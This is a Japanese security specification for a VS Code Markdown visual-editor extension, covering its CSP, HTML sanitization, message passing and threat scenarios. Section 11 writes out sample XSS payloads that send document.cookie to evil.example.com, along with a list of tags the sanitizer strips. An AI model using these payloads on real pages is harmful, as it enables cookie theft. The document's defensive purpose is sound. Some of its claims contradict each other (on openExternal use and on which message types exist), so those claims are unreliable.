# Markdown Visual Editor — セキュリティ・機密情報取り扱い仕様書

| 項目 | 内容 |
|---|---|
| ドキュメントバージョン | 2.0 |
| 対象拡張機能 | Markdown Visual Editor v0.4.1 |
| 作成日 | 2026-04-10 |
| 最終レビュー日 | 2026-04-27 |
| レビュー対象ファイル | `src/extension.ts`, `src/markdownVisualEditorProvider.ts`, `media/editor.js`, `media/mermaid-visual-editor.js`, `media/diagram-editors.js`, `media/editor.css`, `package.json` |

---

## 1. エグゼクティブサマリー

本拡張機能は **完全ローカル動作** の Markdown ビジュアルエディタである。Mermaid ダイアグラム 21 種類（高機能 GUI 7 種 + 汎用フォーム GUI 14 種）のビジュアル編集とテーブルの GUI 編集に対応している。外部サーバーへの通信は一切行わず、ファイルシステムへのアクセスも開いているドキュメント 1 ファイルに限定される。テレメトリ・分析・認証機能は含まれていない。機密情報が外部へ漏洩する経路は存在しない。

v0.3.1 で以下の UI 機能が追加されたが、いずれも WebView 内のテキスト処理または VS Code API への閉じた呼び出しに留まり、外部通信は発生しない:
- ☀️/🌙 テーマ強制切替（DOM クラス操作のみ）
- 🔍 検索／置換バー（DOM の TreeWalker による文字列マッチ）
- 📝 「テキストエディタで開く」（`vscode.openWith` を 'default' で実行）
- リンクの Ctrl+Click（`vscode.env.openExternal` または `vscode.open` コマンドで OS のハンドラに委譲。`http(s):` / `mailto:` のみ `openExternal` を使用）

---

## 2. アーキテクチャ概要とデータフロー

```
┌──────────────────────────────────────────────────────┐
│  VS Code Host Process (Node.js)                      │
│  ┌────────────────────────────────┐                  │
│  │  extension.ts                  │                  │
│  │  markdownVisualEditorProvider  │                  │
│  │  ・CustomTextEditorProvider    │                  │
│  │  ・ドキュメント読み書き         │                  │
│  └──────────┬─────────────────────┘                  │
│             │ postMessage (テキストのみ)              │
│             │ メッセージ型: 'update' / 'edit' / 'ready│
│  ┌──────────▼─────────────────────┐                  │
│  │  WebView (Sandboxed iframe)    │                  │
│  │  ・marked.js  (Markdownパース) │                  │
│  │  ・mermaid.js (SVGレンダリング) │                  │
│  │  ・editor.js  (UI制御)         │                  │
│  │  ・mermaid-visual-editor.js   │                  │
│  │    (フローチャートGUI)          │                  │
│  │  ・diagram-editors.js         │                  │
│  │    (クラス図/シーケンス図/      │                  │
│  │     マインドマップ/象限/ガント/  │                  │
│  │     ER図/テーブル エディタ)      │                  │
│  │  ・editor.css (スタイル)       │                  │
│  │  ※ ネットワークアクセス不可     │                  │
│  └────────────────────────────────┘                  │
└──────────────────────────────────────────────────────┘
```

### 2.1 データフローの詳細

| ステップ | 方向 | データ内容 | 処理 |
|---|---|---|---|
| 1 | ホスト → WebView | `{type:'update', text:'...'}` | ドキュメント全文をWebViewへ送信 |
| 2 | WebView内部 | marked.jsでトークン分割 → HTML変換 | ローカルパース処理のみ |
| 3 | WebView内部 | mermaid.jsでSVG生成 | DOMレンダリングのみ |
| 4 | WebView → ホスト | `{type:'edit', text:'...'}` | 編集後テキストを返送しファイル保存 |
| 5 | WebView → ホスト | `{type:'ready'}` | 初期ロード完了通知（データなし） |

**上記以外のデータフローは存在しない。**

---

## 3. ネットワーク通信の不在証明

### 3.1 外部通信を行わない根拠

本拡張機能は **外部への通信を一切行わない**。以下にその根拠を列挙する。

| 検証項目 | 検証結果 | 該当コード |
|---|---|---|
| `fetch()` の使用 | **なし** | 全ソースコード検索で確認済み |
| `XMLHttpRequest` の使用 | **なし** | 全ソースコード検索で確認済み |
| `WebSocket` の使用 | **なし** | 全ソースコード検索で確認済み |
| `http` / `https` モジュールの使用 | **なし** | Node.js側ソースで未import |
| `net` / `dgram` モジュールの使用 | **なし** | Node.js側ソースで未import |
| テレメトリ / Analytics SDK | **なし** | package.jsonの依存関係に不在 |
| 外部API呼び出し | **なし** | URL文字列リテラルがコード内に不在 |
| `vscode.env.openExternal()` の使用 | **なし** | 外部ブラウザ/URLオープン処理不在 |

### 3.2 Content Security Policy (CSP) による制限

WebView HTMLに以下のCSPヘッダーを設定しており、ネットワーク通信をブラウザレベルで遮断している。

```
Content-Security-Policy:
  default-src 'none';
  img-src ${cspSource} data: blob: https:;
  style-src ${cspSource} 'unsafe-inline';
  script-src 'nonce-${nonce}' 'unsafe-eval';
  font-src ${cspSource};
  worker-src ${cspSource} blob:;
  connect-src ${cspSource};
```

**該当ファイル:** `src/markdownVisualEditorProvider.ts` — `getHtmlForWebview()` メソッド

| CSPディレクティブ | 設定値 | セキュリティ効果 |
|---|---|---|
| `default-src` | `'none'` | 明示的に許可されていないリソースはすべてブロック |
| `connect-src` | `${cspSource}` | WebView ローカルリソースへの接続のみ許可。外部 URL への fetch / XHR / WebSocket は **ブロック** |
| `worker-src` | `${cspSource} blob:` | WebView ローカルリソースおよび blob URL からの Web Worker のみ許可（mermaid.js 内部処理用） |
| `script-src` | `'nonce-${nonce}'` + `'unsafe-eval'` | nonce付きスクリプトタグのみ実行可。インラインスクリプト不可 |
| `img-src` | `${cspSource} data: blob: https:` | 画像のみ外部参照可（Markdown内画像表示用） |
| `style-src` | `${cspSource} 'unsafe-inline'` | 拡張機能内CSSとインラインスタイルのみ許可 |
| `font-src` | `${cspSource}` | 拡張機能内フォントのみ |
| `frame-src` | 未指定（→ `'none'`） | iframe埋め込み不可 |
| `object-src` | 未指定（→ `'none'`） | プラグイン不可 |

> **重要:** `connect-src` は `${cspSource}`（WebView ローカルリソース URL）に限定されており、外部 URL への `fetch()` / `XMLHttpRequest` はブラウザが CSP 違反としてリクエストを拒否する。これにより、仮にスクリプト内で外部通信コードが実行されても、外部サーバーへのデータ送信は不可能である。

### 3.3 CSPにおける `'unsafe-eval'` の必要性と影響

| 項目 | 説明 |
|---|---|
| 存在理由 | mermaid.js ライブラリの内部処理で `new Function()` を使用するため |
| 影響範囲 | WebView内のJavaScript `eval()` / `new Function()` が実行可能になる |
| リスク評価 | **低リスク** — WebViewはサンドボックス内で動作し、実行されるスクリプトはnonce付きの信頼済みスクリプトのみ。外部スクリプト注入はCSPで防止されている |
| 代替手段 | mermaid.js がeval不要なビルドを提供した場合は除去可能 |

### 3.5 Mermaid `securityLevel: 'loose'` の設定理由と影響

| 項目 | 説明 |
|---|---|
| 設定値 | `securityLevel: 'loose'` |
| 設定理由 | Mermaid ダイアグラムの HTML ラベル（リッチテキスト表示）を有効にするため。`'strict'` ではすべてのラベルがプレーンテキストに制限され、表現力が低下する |
| 影響範囲 | Mermaid コード内の HTML ラベルが HTML として解釈される |
| 内部防御 | mermaid.js は内部で **DOMPurify**（HTMLサニタイズライブラリ）を使用しており、`<script>` タグや `onerror` 等の危険な要素は自動的に除去される |
| リスク評価 | **低リスク** — DOMPurify による内部サニタイズ + CSP の nonce 制約 + `connect-src` のローカル制限により、仮に HTML が注入されても外部へのデータ送信やスクリプト実行は実質不可能 |
| 代替案 | `'strict'` に変更可能だが、HTML ラベルを使用する既存ドキュメントの表示が劣化する |

### 3.4 CSPにおける `'unsafe-inline'`（style-src）について

| 項目 | 説明 |
|---|---|
| 存在理由 | mermaid.jsがSVGレンダリング時にインラインstyle属性を生成するため |
| 影響範囲 | style属性・`<style>`タグによるCSS注入が可能 |
| リスク評価 | **低リスク** — CSSのみのデータ漏洩は`connect-src`がローカルリソースに制限されているため不可能。CSS Injection攻撃の最大リスクはUI偽装だが、WebViewサンドボックス内に限定される |

---

## 4. ファイルシステムアクセスの制限

### 4.1 ドキュメントアクセス範囲

本拡張機能がアクセスするファイルは **ユーザーが明示的に開いた1つの `.md` ファイルのみ** である。

```typescript
// markdownVisualEditorProvider.ts — resolveCustomTextEditor()
// VS Codeから渡されるdocument引数のみを使用
document.getText()  // 読み取り
edit.replace(document.uri, fullRange, message.text)  // 書き込み
```

| 検証項目 | 検証結果 |
|---|---|
| `vscode.workspace.fs` の使用 | **なし** — 任意のファイル読み書き不可 |
| `fs` / `path` モジュールの使用 | **なし** — Node.jsファイルAPIを直接使用していない |
| `vscode.workspace.openTextDocument()` の使用 | **なし** — 他ファイルを開かない |
| ワークスペース走査・検索 | **なし** |
| 一時ファイル作成 | **なし** |
| クリップボードアクセス | **なし** |

### 4.2 WebView内のリソースアクセス制限

```typescript
// markdownVisualEditorProvider.ts
localResourceRoots: [
  vscode.Uri.joinPath(this.context.extensionUri, 'media'),
  vscode.Uri.joinPath(this.context.extensionUri, 'node_modules'),
],
```

`localResourceRoots` により、WebViewからアクセス可能なファイルシステムは **拡張機能自体の `media/` と `node_modules/` ディレクトリのみ** に制限されている。ユーザーのワークスペースファイル、システムファイル、他の拡張機能のファイルに直接アクセスすることは不可能である。

---

## 5. XSS（クロスサイトスクリプティング）対策

### 5.1 対策一覧

| 攻撃ベクター | 対策 | 実装箇所 |
|---|---|---|
| Markdownパース結果のHTML注入 | `sanitizeHtml()` によるDOMベースサニタイズ | `media/editor.js` — `renderBlockContent()` |
| ユーザー入力のHTML属性注入 | `escapeHtmlAttr()` による属性エスケープ | `media/editor.js` — `renderBlockContent()` |
| テキストコンテンツのエスケープ | `escapeHtml()` によるテキストエスケープ | `media/editor.js` — `startEditing()`, エラー表示等 |
| Mermaidダイアグラム経由のスクリプト注入 | `securityLevel: 'loose'` + DOMPurify 内部サニタイズ | `media/editor.js` — `mermaid.initialize()` |
| ダイアグラムエディタのユーザー入力 | DOM操作のみ（innerHTML不使用）、textContent/value経由 | `media/diagram-editors.js` — 各エディタクラス |
| インラインスクリプト挿入 | CSP `script-src` でnonce必須 | `src/markdownVisualEditorProvider.ts` |
| 外部スクリプト読み込み | CSP `script-src` でnonce必須 + `default-src 'none'` | `src/markdownVisualEditorProvider.ts` |

### 5.2 HTMLサニタイズの詳細

`sanitizeHtml()` 関数で以下の危険要素・属性を除去している。

**除去される要素（タグ）：**
```
script, iframe, object, embed, form, input, textarea, select,
button, style, link, meta, base, applet, frame, frameset,
layer, ilayer, bgsound
```

**除去される属性：**
- すべての `on*` イベントハンドラ属性（`onclick`, `onerror`, `onload` 等）
- `javascript:` / `vbscript:` を含む `href`, `src`, `action`, `formaction`, `xlink:href` 属性
- `<img>` 以外の要素の `data:` URI を含む `src` 属性

### 5.3 Mermaid セキュリティ設定

```javascript
mermaid.initialize({
  securityLevel: 'loose',  // HTMLラベルを許可しつつDOMPurifyでサニタイズ
  ...
});
```

`securityLevel: 'loose'` 設定により、MermaidはHTMLラベルを許可するが、内部でDOMPurifyを使用して危険なタグ・属性を自動除去する。さらにCSPのnonce制約と`connect-src`制限により、仮にDOMPurifyをすり抜けるHTMLが注入された場合でも、外部へのデータ送信や任意のスクリプト実行はブロックされる。

### 5.4 Nonceベースのスクリプト制御

```html
<script nonce="${nonce}" src="${markedUri}"></script>
<script nonce="${nonce}" src="${mermaidUri}"></script>
<script nonce="${nonce}" src="${editorScriptUri}"></script>
```

- nonceは `getNonce()` により32文字のランダム英数字列として毎回生成される
- nonce属性が一致しないスクリプトはCSPにより実行を拒否される
- **リクエストごとにnonceが再生成** されるため、予測・再利用は不可能

---

## 6. メッセージパッシングのセキュリティ

### 6.1 メッセージ型の厳密な制限

ホスト（Node.js）側で処理されるWebViewからのメッセージは **以下 4 種類のみ** である（v0.3.1 時点）。

```typescript
// markdownVisualEditorProvider.ts
switch (message.type) {
  case 'edit':       // テキスト文字列の受信 → ドキュメント更新
  case 'ready':      // 初期化完了通知（データなし）
  case 'openLink':   // v0.3.1。Ctrl+Click されたリンク URI を OS / VS Code で開く
  case 'openAsText': // v0.3.1。標準テキストエディタで開き直す
}
```

| メッセージ型 | 方向 | データ | 処理 |
|---|---|---|---|
| `ready` | WebView → ホスト | なし | ドキュメント全文をWebViewに送信 |
| `update` | ホスト → WebView | Markdownテキスト | WebView内でパース・レンダリング |
| `edit` | WebView → ホスト | Markdownテキスト | VS CodeのWorkspaceEdit APIでドキュメント更新 |
| `openLink` | WebView → ホスト | URI 文字列 | `http(s):` / `mailto:` のみ `vscode.env.openExternal`、他は `vscode.commands.executeCommand('vscode.open', uri)`。直接シェル実行はしない |
| `openAsText` | WebView → ホスト | なし | `vscode.commands.executeCommand('vscode.openWith', uri, 'default')` を実行 |

### 6.2 メッセージインジェクション耐性

- WebView は VS Code が管理するサンドボックスiframe内で動作する
- `postMessage` はVS Code WebView APIを経由し、origin検証が自動的に行われる
- `message.type` に対する `switch` 文は未知のメッセージ型を無視する（デフォルトハンドラなし）
- `message.text` は文字列としてのみ使用され、`eval()` や動的コード実行には渡されない
- `openLink` の URI は `vscode.Uri.parse()` で正規化してから渡し、スキームを `http` / `https` / `mailto` で前段ホワイトリストする。シェルコマンドや任意のプロセス起動には繋がらない

### 6.3 InfiniteLoop / DoS 防御

- ホスト→WebView→ホストの循環更新は `isWebviewEdit` フラグで防止
- WebViewからの `edit` メッセージ処理中は `isWebviewEdit = true` となり、`onDidChangeTextDocument` のWebView再通知をスキップする

---

## 7. 依存パッケージのセキュリティ

### 7.1 ランタイム依存パッケージ

| パッケージ | バージョン | 用途 | WebView内使用 | ネットワーク通信 |
|---|---|---|---|---|
| `marked` | ^4.3.0 | Markdownパース・HTML変換 | はい | **なし** |
| `mermaid` | ^10.6.0 | ダイアグラムSVGレンダリング | はい | **なし** |

### 7.2 開発時のみ依存パッケージ

| パッケージ | バージョン | 用途 | ランタイム同梱 |
|---|---|---|---|
| `@types/vscode` | ^1.80.0 | TypeScript型定義 | **いいえ** |
| `esbuild` | ^0.19.0 | ビルドツール | **いいえ** |
| `typescript` | ^5.0.0 | コンパイラ | **いいえ** |
| `@vscode/vsce` | ^2.22.0 | VSIXパッケージツール | **いいえ** |

### 7.3 推移的依存パッケージの互換性制御

`package.json` の `overrides` フィールドで以下の推移的依存バージョンを固定している。

```json
"overrides": {
  "lru-cache": "~10.4.3"
}
```

| パッケージ | 固定理由 | 影響 |
|---|---|---|
| `lru-cache` | v11.x が `node:diagnostics_channel` の `tracingChannel()` API を使用（Node.js 20+ 限定）。ビルド環境の Node 18.x との互換性を維持するため v10.4.3 に固定 | ランタイムに含まれないため拡張機能の動作には影響なし。ビルドツール（`@vscode/vsce` → `path-scurry` → `lru-cache`）の依存チェーンにのみ関係する |

> **注意:** Node.js のメジャーバージョンをアップグレードした場合は、この `overrides` を削除して最新の依存バージョンに戻すことを推奨する。

### 7.4 推奨する運用時の対策

```bash
# 定期的な脆弱性チェック
npm audit

# 脆弱性の自動修正（互換性確認後に実行）
npm audit fix
```

依存パッケージに脆弱性が報告された場合は、`npm audit` で検出し速やかにバージョンを更新すること。

---

## 8. 機密情報の取り扱い

### 8.1 機密情報の非保持証明

本拡張機能は **いかなる機密情報も保存・送信・キャッシュしない**。

| 検証項目 | 結果 | 根拠 |
|---|---|---|
| 認証情報（ID/パスワード/トークン）の処理 | **なし** | 認証機能自体が存在しない |
| `vscode.SecretStorage` の使用 | **なし** | シークレットストレージ未使用 |
| `vscode.workspace.getConfiguration()` での機密値読み取り | **なし** | 設定機能自体が存在しない |
| `globalState` / `workspaceState` への書き込み | **なし** | 状態永続化を行わない |
| localStorage / sessionStorage / IndexedDB の使用 | **なし** | WebView内でブラウザストレージ未使用 |
| Cookie の設定・読み取り | **なし** | Cookie操作コード不在 |
| 環境変数 (`process.env`) の読み取り | **なし** | 環境変数アクセス不在 |
| ログへの機密情報出力 | **なし** | `console.warn` による初期化失敗メッセージのみ |
| 一時ファイル・キャッシュファイルの作成 | **なし** | ファイルシステム書き込みはドキュメント保存のみ |
| クリップボードへのアクセス | **なし** | `navigator.clipboard` / `vscode.env.clipboard` 未使用 |

### 8.2 編集中ドキュメントの取り扱い

```
ドキュメント内容の経路:
  ファイルシステム → VS Code TextDocument → postMessage → WebView内メモリ
                                                         ↓
                                          marked.jsでパース（メモリ内のみ）
                                                         ↓
                                          DOM要素として画面表示
                                                         ↓ (編集時)
                                  postMessage → VS Code WorkspaceEdit → ファイル保存
```

- ドキュメント内容は **VS Code ↔ WebView 間の `postMessage` のみ** で転送される
- `postMessage` は同一プロセス内のメッセージングであり、ネットワークを経由しない
- 編集内容はメモリ上にのみ存在し、ユーザーが保存操作を行うまでディスクに書き込まれない
- WebView破棄時にメモリ上のデータはガベージコレクションで消去される

### 8.3 機密文書を編集する場合のリスク評価

| リスクシナリオ | 評価 | 理由 |
|---|---|---|
| ネットワーク経由での漏洩 | **リスクなし** | CSP `connect-src` がローカルリソースに制限 + 通信コード不在 |
| 他の拡張機能への漏洩 | **リスクなし** | WebViewは拡張機能間で隔離されている |
| ファイルシステム経由での漏洩 | **リスクなし** | 開いたドキュメント以外への書き込み不可 |
| メモリダンプ経由での漏洩 | **OS特権アクセスが必要** | VS Code/Electronプロセスのメモリダンプ取得にはOS管理者権限が必要。本拡張機能固有のリスクではない |

---

## 9. 権限（Permissions）の最小化

### 9.1 VS Code API 使用状況

本拡張機能が使用するVS Code APIは **CustomTextEditorに必要な最小限のみ** である。

| 使用API | 目的 |
|---|---|
| `vscode.window.registerCustomEditorProvider` | カスタムエディタの登録 |
| `vscode.workspace.applyEdit` | ドキュメントテキストの更新 |
| `vscode.workspace.onDidChangeTextDocument` | 外部変更の検知 |
| `webviewPanel.webview.postMessage` | WebViewへのデータ送信 |
| `webviewPanel.webview.onDidReceiveMessage` | WebViewからのデータ受信 |

### 9.2 使用していない権限・API

以下の権限・APIは **一切使用していない**：

- ファイルシステム走査 (`vscode.workspace.findFiles` 等)
- ターミナル操作 (`vscode.window.createTerminal` 等)
- デバッグ (`vscode.debug.*`)
- タスク実行 (`vscode.tasks.*`)
- Git操作 (`vscode.extensions.getExtension('vscode.git')`)
- 認証プロバイダ (`vscode.authentication.*`)
- コメント (`vscode.comments.*`)
- ネットワークリクエスト
- シークレットストレージ
- グローバル/ワークスペース状態

### 9.3 `activationEvents` の設定

```json
"activationEvents": []
```

`activationEvents` が空配列であるため、拡張機能は **対応エディタが開かれたときのみアクティベートされる**。バックグラウンドで常駐しない。

---

## 10. OWASP Top 10 との対照

| OWASP カテゴリ | 適用可否 | 本拡張機能における対策 |
|---|---|---|
| A01 アクセス制御の不備 | 限定的 | VS Code / OS のファイル権限に委譲。独自の認証・認可は不要（単一ユーザーローカルアプリ） |
| A02 暗号化の失敗 | **該当なし** | 機密データの保存・送信を行わない |
| A03 インジェクション | **対策済み** | HTMLサニタイズ(`sanitizeHtml()`)、属性エスケープ(`escapeHtmlAttr()`)、テキストエスケープ(`escapeHtml()`)、CSP、Mermaid `loose` モード + DOMPurify 内部サニタイズ |
| A04 安全でない設計 | **対策済み** | 最小権限原則。ネットワーク通信なし。メッセージ型の厳密制限 |
| A05 セキュリティの設定ミス | **対策済み** | CSP設定済み。`localResourceRoots` 制限済み。nonce毎回再生成 |
| A06 脆弱で古いコンポーネント | **運用対策** | `npm audit` による定期スキャンを推奨 |
| A07 識別と認証の失敗 | **該当なし** | 認証機能なし |
| A08 ソフトウェアとデータの完全性の失敗 | **対策済み** | CSPのnonce制約により改竄スクリプトの実行防止 |
| A09 セキュリティログとモニタリングの失敗 | **該当なし** | サーバーサイドアプリケーションではない |
| A10 サーバーサイドリクエストフォージェリ (SSRF) | **該当なし** | サーバーサイド通信なし |

---

## 11. 攻撃シナリオと防御の検証

### 11.1 悪意のあるMarkdownファイルを開いた場合

**シナリオ:** 攻撃者が以下のようなMarkdownファイルを配布する。

```markdown
# 悪意のあるドキュメント

<script>fetch('https://evil.example.com/steal?data='+document.cookie)</script>

<img src="x" onerror="new Image().src='https://evil.example.com/'+document.cookie">

[クリック](javascript:alert(1))
```

**防御結果:**

| 攻撃ベクター | 防御層 | 結果 |
|---|---|---|
| `<script>` タグ | `sanitizeHtml()` で除去 + CSP nonce不一致で実行拒否 | **ブロック（二重防御）** |
| `onerror` 属性 | `sanitizeHtml()` で `on*` 属性をすべて除去 | **ブロック** |
| `javascript:` href | `sanitizeHtml()` で `javascript:` URLを除去 | **ブロック** |
| 仮に `fetch()` が実行されても | CSP `connect-src` がローカルリソースに制限され、外部 URL へのリクエスト拒否 | **ブロック** |

### 11.2 悪意のあるMermaidダイアグラム

**シナリオ:**

```markdown
```mermaid
graph TD
    A["<img src=x onerror=fetch('https://evil.example.com/')>"]
```　
```

**防御結果:**

| 防御層 | 効果 |
|---|---|
| `mermaid.initialize({ securityLevel: 'loose' })` | HTMLラベルを許可しつつDOMPurifyで危険なHTMLを除去 |
| CSP `connect-src` がローカルリソースに制限 | 仮にfetchが実行されても外部URLへのリクエスト拒否 |

### 11.3 VS Code拡張機能ホスト側への攻撃

**シナリオ:** WebViewから悪意のあるメッセージを送信。

```javascript
vscode.postMessage({ type: 'edit', text: '悪意のあるテキスト' });
```

**防御結果:**

- ホスト側では `message.text` を `WorkspaceEdit.replace()` に渡すのみ
- テキストはコードとして評価されず、開いているドキュメントに書き込まれるのみ
- ファイルパスは `document.uri`（ユーザーが元々開いたファイル）に固定
- **任意ファイルへの書き込みは不可能**

---

## 12. 既知の制限事項と受容リスク

| 項目 | リスクレベル | 説明 | 緩和策 |
|---|---|---|---|
| CSP `'unsafe-eval'` | 低 | mermaid.jsの内部動作に必要 | nonce制約+CSPの他ディレクティブで実質的な悪用不可。mermaid.jsのアップデートで除去可能になった場合は対応 |
| CSP `'unsafe-inline'`（style） | 低 | mermaid.jsのSVGインラインスタイルに必要 | CSSのみの攻撃でデータ漏洩は不可能（`connect-src` がローカルリソースに制限） |
| `img-src` に `https:` を許可 | 低 | Markdown内の外部画像参照表示のため | 画像リクエスト時にIPアドレスが画像ホストに通知される。機密環境ではオフライン画像のみ使用を推奨 |
| 依存ライブラリの将来の脆弱性 | 中 | marked / mermaid に未知の脆弱性が発見される可能性 | 定期的な `npm audit` とバージョン更新で対応 |
| 推移的依存の Node.js バージョン要求 | 低 | `lru-cache` 等の推移的依存が新しい Node.js API を要求する可能性 | `package.json` の `overrides` でバージョン固定。Node.js アップグレード時に解除 |

---

## 13. セキュリティチェックリスト

開発・レビュー・リリース前に確認すべき項目：

- [x] CSPヘッダーが設定されている
- [x] `default-src 'none'` で全通信をデフォルトブロック
- [x] `connect-src` が `${cspSource}`（WebView ローカルリソース）に制限され、外部 URL への HTTP リクエスト不可
- [x] スクリプトにnonceが設定されリクエストごとに再生成
- [x] `localResourceRoots` が最小限（`media/` と `node_modules/` のみ）
- [x] WebViewメッセージの型が厳密に制限されている（`edit` / `ready` のみ）
- [x] `innerHTML` への代入前にサニタイズが行われている
- [x] イベントハンドラ属性（`on*`）が除去されている
- [x] `javascript:` / `vbscript:` URLが除去されている
- [x] 危険なHTML要素（`script`, `iframe` 等）が除去されている
- [x] Mermaid `securityLevel` が `'loose'`（DOMPurifyによる内部サニタイズ + CSPで外部通信ブロック）
- [x] ファイルシステムアクセスが開いたドキュメントのみに制限されている
- [x] 認証情報・APIキー等がコード内にハードコードされていない
- [x] テレメトリ・分析機能が含まれていない
- [x] `activationEvents` が空で不要な常駐をしない
- [x] 依存パッケージの `npm audit` が実行済み

---

## 14. 結論

本拡張機能は以下の設計原則に基づき、**外部への情報漏洩リスクがないことが検証済み** である。

1. **完全ローカル動作** — ネットワーク通信コードが存在せず、CSPにより通信が二重にブロックされている
2. **最小権限** — VS Code APIの使用は必要最低限に限定され、ファイルアクセスは開いたドキュメント1ファイルのみ
3. **多層防御** — HTMLサニタイズ + CSP + nonce + Mermaid DOMPurify + WebViewサンドボックスの5層防御
4. **データ非保持** — 機密情報の保存・キャッシュ・送信を一切行わない
5. **透明性** — 全ソースコードが閲覧可能であり、本ドキュメントで動作の完全な説明を提供
